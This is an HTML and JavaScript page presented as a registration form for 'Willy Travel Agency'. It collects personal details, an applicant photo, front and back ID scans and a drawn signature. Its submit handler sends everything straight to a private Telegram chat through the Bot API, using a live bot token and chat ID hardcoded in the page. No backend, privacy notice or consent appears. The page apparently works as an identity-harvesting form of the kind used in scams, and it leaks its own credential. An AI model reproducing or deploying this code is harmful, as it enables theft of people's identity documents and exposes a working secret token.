<!DOCTYPE html>
<html lang="am">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WILLY TRAVEL AGENCY - Registration</title>

<style>
:root{--accent:#0a8d34;--danger:#e63939}
body{margin:0;padding:12px;font-family:Arial;background:#f2f2f2}
.container{max-width:760px;margin:auto;background:#fff;padding:14px;border-radius:10px;box-shadow:0 6px 20px rgba(0,0,0,.08)}
.flag{width:110px;display:block;margin:auto}
h1{text-align:center;font-size:20px;margin:6px 0}
label{font-weight:bold;margin-top:8px;display:block}
input,select,button{width:100%;padding:10px;font-size:16px;border-radius:8px;border:1px solid #ccc;margin-top:4px}
.section{margin-top:14px;background:#f7f7f7;padding:8px;border-radius:6px;font-weight:bold}
.img-preview{width:100%;max-width:220px;height:160px;object-fit:cover;border:1px solid #ddd;border-radius:6px;margin-top:6px;display:none}
canvas{width:100%;height:200px;border:2px solid #333;border-radius:6px;touch-action:none}
.controls{display:flex;gap:8px;margin-top:8px}
.controls button{flex:1}
.btn-primary{background:var(--accent);color:#fff;border:none}
.btn-clear{background:var(--danger);color:#fff;border:none}
#loader{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.6);z-index:1000;align-items:center;justify-content:center;color:#fff;font-size:22px}
#popupOverlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.65);align-items:center;justify-content:center;z-index:999}
#popupBox{background:#fff;padding:20px;border-radius:14px;text-align:center;width:90%;max-width:360px}
.popup-title{font-size:20px;font-weight:bold;color:#0a8d34}
.popup-code{font-size:24px;font-weight:800;color:#004aad;margin-top:10px}
</style>
</head>

<body>

<div id="loader">Processing... Please wait</div>

<div class="container">
<img class="flag" src="https://upload.wikimedia.org/wikipedia/commons/7/71/Flag_of_Ethiopia.svg">
<h1>WILLY TRAVEL AGENCY</h1>

<label>Date</label>
<input type="date" id="dateInput">

<label>Upload Photo</label>
<input type="file" id="photoInput" accept="image/*">
<img id="photoPreview" class="img-preview">

<div class="section">Identity Information</div>

<label>Full Name</label><input id="fullName">
<label>Sex</label>
<select id="sex"><option>Male</option><option>Female</option></select>
<label>Age</label><input type="number" id="age">
<label>Phone</label><input id="phone">
<label>Address</label><input id="address">
<label>Height (cm)</label><input type="number" id="height">
<label>Weight (kg)</label><input type="number" id="weight">
<label>District</label><input id="district">
<label>Kebele</label><input id="kebele">
<label>Birth Date</label><input type="date" id="bod">
<label>Birth Place</label><input id="bop">

<div class="section">Holder Information</div>
<label>Holder Name</label><input id="holderName">
<label>Holder Phone</label><input id="holderPhone">

<div class="section">Signature</div>
<canvas id="signaturePad"></canvas>
<div class="controls">
<button class="btn-clear" id="clearBtn">Clear</button>
<button class="btn-primary" id="previewBtn">Preview</button>
</div>
<img id="signaturePreview" class="img-preview">

<div class="section">ID Upload</div>
<label>ID Front</label>
<input type="file" id="idFrontInput" accept="image/*">
<img id="idFrontPreview" class="img-preview">

<label>ID Back</label>
<input type="file" id="idBackInput" accept="image/*">
<img id="idBackPreview" class="img-preview">

<button id="submitBtn" class="btn-primary" style="margin-top:14px">Submit</button>
</div>

<div id="popupOverlay">
<div id="popupBox">
<div class="popup-title">Form Submitted Successfully</div>
<div class="popup-code" id="uniqueCode"></div>
</div>
</div>

<script>
const $=id=>document.getElementById(id);

/* Image Preview */
function preview(i,p){$(i).onchange=()=>{const f=$(i).files[0];if(f){$(p).src=URL.createObjectURL(f);$(p).style.display="block"}}}
preview("photoInput","photoPreview");
preview("idFrontInput","idFrontPreview");
preview("idBackInput","idBackPreview");

/* Signature */
const canvas=$("signaturePad"),ctx=canvas.getContext("2d");
let draw=false;
function resize(){const r=canvas.getBoundingClientRect();canvas.width=r.width;canvas.height=r.height;ctx.lineWidth=2.5;ctx.lineCap="round"}
resize();
canvas.onpointerdown=e=>{draw=true;ctx.beginPath();ctx.moveTo(e.offsetX,e.offsetY)}
canvas.onpointermove=e=>{if(draw){ctx.lineTo(e.offsetX,e.offsetY);ctx.stroke()}}
canvas.onpointerup=()=>draw=false;
$("clearBtn").onclick=()=>ctx.clearRect(0,0,canvas.width,canvas.height);
$("previewBtn").onclick=()=>{$("signaturePreview").src=canvas.toDataURL();$("signaturePreview").style.display="block"}

/* Telegram */
const BOT="8547531640:AAGBhfzBDJ18t40R4F4z-sO5a50Q6Mj2Fgw";
const CHAT="8267646853";

async function sendText(t){
await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({chat_id:CHAT,text:t})
});
}
async function sendPhoto(f,c){
const fd=new FormData();
fd.append("chat_id",CHAT);
fd.append("photo",f);
fd.append("caption",c);
await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`,{method:"POST",body:fd});
}
function canvasBlob(){return new Promise(r=>canvas.toBlob(b=>r(b)))}

/* SUBMIT */
$("submitBtn").onclick=async()=>{
if(!$("fullName").value.trim()) return alert("Enter full name");

$("loader").style.display="flex";
$("submitBtn").disabled=true;

const code="WTA-"+Math.floor(100000+Math.random()*900000);
$("uniqueCode").innerText=code;

const message = `
ğŸ“Œ WILLY TRAVEL AGENCY â€“ FULL FORM

ğŸ“… Date: ${$("dateInput").value}

ğŸ‘¤ Full Name: ${$("fullName").value}
âš§ Sex: ${$("sex").value}
ğŸ‚ Age: ${$("age").value}
ğŸ“ Phone: ${$("phone").value}
ğŸ  Address: ${$("address").value}

ğŸ“ Height: ${$("height").value} cm
âš–ï¸ Weight: ${$("weight").value} kg

ğŸŒ District: ${$("district").value}
ğŸ˜ Kebele: ${$("kebele").value}

ğŸ‰ Birth Date: ${$("bod").value}
ğŸ“ Birth Place: ${$("bop").value}

ğŸ‘¨ Holder Name: ${$("holderName").value}
ğŸ“ Holder Phone: ${$("holderPhone").value}

ğŸ” UNIQUE CODE: ${code}
`;

await sendText(message);

if($("photoInput").files[0]) await sendPhoto($("photoInput").files[0],"Applicant Photo");
if($("idFrontInput").files[0]) await sendPhoto($("idFrontInput").files[0],"ID Front");
if($("idBackInput").files[0]) await sendPhoto($("idBackInput").files[0],"ID Back");

const sig=await canvasBlob();
if(sig) await sendPhoto(sig,"Signature");

$("loader").style.display="none";
$("popupOverlay").style.display="flex";
};
</script>

</body>
</html>